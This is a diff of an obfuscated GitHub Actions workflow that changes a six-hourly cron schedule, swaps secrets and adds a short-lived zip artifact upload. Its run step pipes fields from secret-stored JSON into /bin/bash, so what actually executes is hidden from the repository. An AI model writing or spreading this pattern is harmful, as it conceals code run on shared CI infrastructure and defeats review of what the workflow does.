@@ -1,10 +1,9 @@
 name: timothymobile922
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '18 5/6 * * *'
 
+  schedule:
+    - cron: '30 0,6,12,18 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,16 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: timothymobile922
         env:
-          ha69314: ${{ secrets.ha69314 }}
+          xwn0259: ${{ secrets.xwn0259 }}
         run: |
-          echo $ha69314 | jq -r .bwl45353 | /bin/bash
-          echo $jhxd9 | jq -r .oaxdo8300 | /bin/bash
-          echo $dv060 | jq -r .tpsg07 | /bin/bash
-          echo $fjhuy204 | jq -r .obltk0280 | /bin/bash
-          echo $otbo92 | jq -r .ykrr68 | /bin/bash
-          echo $afix90 | jq -r .njf07 | /bin/bash
-          echo $j074 | jq -r .v6 | /bin/bash
-          echo $klj78200 | jq -r .fgf599 | /bin/bash
-          echo $eonz9504 | jq -r .mbg17 | /bin/bash
-          echo $jzhx191 | jq -r .hbogh025 | /bin/bash
+          printf '%s' "$xwn0259" | jq -r .xbmqy286 | /bin/bash
+          echo $fkh1 | jq -r .isri221 | /bin/bash
+          echo $ksm2 | jq -r .u899 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: BV8WkDAi
+          path: "*.zip"
+          retention-days: 1
